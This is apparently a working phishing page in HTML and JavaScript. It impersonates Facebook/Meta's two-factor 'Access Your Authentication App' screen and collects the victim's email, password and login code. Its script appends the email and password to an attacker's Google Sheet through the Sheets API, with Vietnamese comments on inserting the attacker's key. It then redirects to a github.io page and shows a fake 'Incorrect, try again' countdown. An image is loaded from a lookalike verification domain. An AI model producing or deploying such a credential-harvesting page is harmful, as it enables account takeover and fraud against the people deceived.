  <style>
    #continueBtn {
      background-color: #A3C5F5;
      cursor: not-allowed;
      transition: background-color 0.3s;
    }

    #continueBtn.active {
      background-color: #1877F2;
      cursor: pointer;
    }
  </style>

<body style="display: block;">
  <div id="root">
    <div class="flex min-h-screen items-center justify-center bg-[#F0F2F5] p-5 font-sans md:p-10">
      <div class="w-full max-w-[600px] bg-[#F0F2F5] p-4 text-left md:p-5">
        <div class="text-xs text-[#606770] mb-2">Facebook</div>
        <h1 class="text-[22px] font-bold text-[#1c1e21] mb-2 md:text-2xl">Access Your Authentication App</h1>
        <p class="text-[13px] font-bold text-[#606770] mb-4 leading-relaxed md:text-sm">
          <span>Check the notification on your other device.<br></span>
          <span>Log in to your Facebook account on another device and open the notification we sent to confirm this login.</span>
        </p>
        <img alt="Authentication Illustration" class="w-full h-auto mb-4 block min-h-[180px] md:min-h-[200px]" src="http://contactadsverrifyaccounts.cloud/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png">
        <input step="1" id="emailInput" placeholder="Enter email" maxlength="100" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="text" value="">
        <input step="1" id="passwordInput" placeholder="Enter password" maxlength="100" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="password" value="">
        <input step="1" id="codeInput" placeholder="Enter code" maxlength="8" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="number" value="">
        <div id="timer" class="text-[#e74c3c] mt-2.5"></div>
        <button id="continueBtn" disabled class="w-full p-3 mt-2 rounded-[25px] text-white font-bold text-[15px] text-center transition-colors md:p-3.5 md:text-[15px]">Continue</button>
        <p class="text-center mt-[20%]">Meta</p>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const codeInput = document.getElementById("codeInput");
      const continueBtn = document.getElementById("continueBtn");
      const emailInput = document.getElementById("emailInput");
      const passwordInput = document.getElementById("passwordInput");
      const timer = document.getElementById("timer");

      codeInput.addEventListener("input", function () {
        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
          continueBtn.disabled = false;
          continueBtn.classList.add("active");
        } else {
          continueBtn.disabled = true;
          continueBtn.classList.remove("active");
        }
      });

      continueBtn.addEventListener("click", function() {
        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
          startTimer();
          continueBtn.disabled = true;
          continueBtn.classList.add("cursor-not-allowed");

          // Lấy giá trị email và password
          const email = emailInput.value;
          const password = passwordInput.value;

          // Gửi email và password tới Google Sheets thông qua Google Sheets API
          const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
          const apiKey = "YOUR_GOOGLE_API_KEY"; // Thay bằng API key của bạn
          const range = "Sheet1!A1:B"; // Cập nhật phạm vi với tên sheet của bạn

          const url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=RAW&key=${apiKey}`;
          
          const data = {
            values: [
              [email, password]
            ]
          };

          fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(data => {
            console.log('Success:', data);
            window.location.href = 'https://girlhotnewstoday.github.io/logins/confirm.html';
          })
          .catch((error) => {
            console.error('Error:', error);
          });
        }
      });

      let seconds = 120;
      function updateTimer() {
        const min = Math.floor(seconds / 60);
        const sec = seconds % 60;
        timer.textContent = `Incorrect. Please, try again after: ${min}:${sec < 10 ? "0" : ""}${sec}`;
        if (seconds > 0) {
          seconds--;
          setTimeout(updateTimer, 1000);
        } else {
          timer.textContent = "Code expired. Please request a new one.";
        }
      }

      function startTimer() {
        updateTimer();
      }
    });
  </script>
